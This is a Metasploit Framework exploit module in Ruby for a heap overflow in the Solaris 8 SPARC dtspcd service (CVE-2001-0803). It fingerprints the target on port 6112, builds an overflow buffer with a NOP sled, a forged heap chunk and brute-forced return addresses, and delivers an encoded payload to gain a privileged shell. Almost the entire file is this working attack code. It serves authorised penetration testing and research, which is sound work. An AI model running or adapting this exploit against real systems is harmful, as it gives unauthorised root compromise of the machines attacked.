##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Solaris dtspcd Heap Overflow',
			'Description'    => %q{
				This is a port of noir's dtspcd exploit. This module should
				work against any vulnerable version of Solaris 8 (sparc).
				The original exploit code was published in the book
				Shellcoder's Handbook.
					
			},
			'Author'         => [ 'noir <noir@uberhax0r.net>', 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'CVE', '2001-0803'],
					[ 'OSVDB', '4503'],
					[ 'BID', '3517'],
					[ 'URL', 'http://www.cert.org/advisories/CA-2001-31.html'],
					[ 'URL', 'http://media.wiley.com/product_ancillary/83/07645446/DOWNLOAD/Source_Files.zip'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 800,
					'BadChars' => "\x00\x0d",
					'PrependEncoder' => ("\xa4\x1c\x40\x11" * 3),
				},
			'Platform'       => 'solaris',
			'Arch'           => ARCH_SPARC,
			'Targets'        => 
				[
					['Solaris 8', 
						{ 'Rets' =>
							[0xff3b0000, 0x2c000, 0x2f000, 0x400, [ 0x321b4, 0x361d8, 0x361e0, 0x381e8 ] ]
						}
					],
				],
			'DisclosureDate' => 'Jul 10 2002',
			'DefaultTarget' => 0))
			
			register_options(
				[
					Opt::RPORT(6112)
				], self.class)
	end


	def exploit
		return if not dtspcd_uname()
		
		target['Rets'][4].each do |tjmp|
			
			rbase = target['Rets'][1]
			
			while (rbase < target['Rets'][2]) do 
				break if session_created?
				begin
					print_status(sprintf("Trying 0x%.8x 0x%.8x...", target['Rets'][0] + tjmp, rbase))
					attack(target['Rets'][0] + tjmp, rbase, payload.encoded)
					break if session_created?
					
					attack(target['Rets'][0] + tjmp, rbase + 4, payload.encoded)
					rbase += target['Rets'][3]
				rescue EOFError
				end
			end
		end
		
		handler
		disconnect
	end
	
	def check
		return Exploit::CheckCode::Detected if dtspcd_uname()
		return Exploit::CheckCode::Safe
	end
	
	def dtspcd_uname
		spc_connect()
		spc_write(spc_register('root', "\x00"), 4)
		host, os, ver, arch = spc_read().gsub("\x00", '').split(':')
		
		return false if not host
		
		print_status("Detected dtspcd running #{os} v#{ver} on #{arch} hardware")
		spc_write("", 2)
		return true
	end


	def chunk_create(retloc, retadd)
		"\x12\x12\x12\x12" +
		[retadd].pack('N')+
		"\x23\x23\x23\x23\xff\xff\xff\xff" +
		"\x34\x34\x34\x34\x45\x45\x45\x45" +
		"\x56\x56\x56\x56" +
		[retloc - 8].pack('N')
	end


	def attack(retloc, retadd, fcode)
		spc_connect()
		
		begin
			buf = ("\xa4\x1c\x40\x11\x20\xbf\xff\xff"  * ((4096 - 8 - fcode.length) / 8)) + fcode
			buf << "\x00\x00\x10\x3e\x00\x00\x00\x14"
			buf << "\x12\x12\x12\x12\xff\xff\xff\xff"
			buf << "\x00\x00\x0f\xf4"
			buf << chunk_create(retloc, retadd)
			buf << "X" * ((0x103e - 8) - buf.length)

			spc_write(spc_register("", buf), 4)
			
			handler
			
		rescue EOFError
		rescue => e
			$stderr.puts "Error: #{e} #{e.class}"
		end
					
		
	end
	

	def spc_register(user='', buff='')
		"4 \x00#{user}\x00\x0010\x00#{buff}"
	end
	
	def spc_write(buff = '', cmd='')
		sock.put(sprintf("%08x%02x%04x%04x  %s", 2, cmd, buff.length, (@spc_seq += 1), buff))
	end
	
	def spc_read
		# Bytes: 0-9 = channel, 9-10 = cmd, 10-13 = mbl, 14-17 = seq
		head = sock.get_once(20)
		sock.get_once( head[10, 13].hex ) || ''
	end

	def spc_connect
		disconnect
		connect
		@spc_seq = 0
	end

end